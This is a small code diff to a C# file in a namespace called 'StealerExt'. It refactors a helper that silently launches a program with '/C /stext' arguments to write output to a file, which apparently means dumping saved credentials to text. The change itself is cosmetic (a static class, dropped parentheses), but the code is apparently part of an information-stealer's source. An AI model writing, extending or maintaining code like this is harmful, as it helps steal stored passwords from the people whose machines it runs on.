@@ -3,7 +3,7 @@ using System.IO;
 
 namespace StealerExt
 {
-    internal class StartProcess
+    internal static class StartProcess
     {
         /// <summary>
         /// Start a process silently and wait for exit.
@@ -12,7 +12,7 @@ namespace StealerExt
         /// <param name="FileName">FileSave Path</param>
         public static void Run(string BaseProgram, string FileName)
         {
-			var cli = new Process()
+			var cli = new Process
 			{
 				StartInfo = new ProcessStartInfo($"{BaseProgram}", $"/C /stext \"{FileName}\"")
 				{
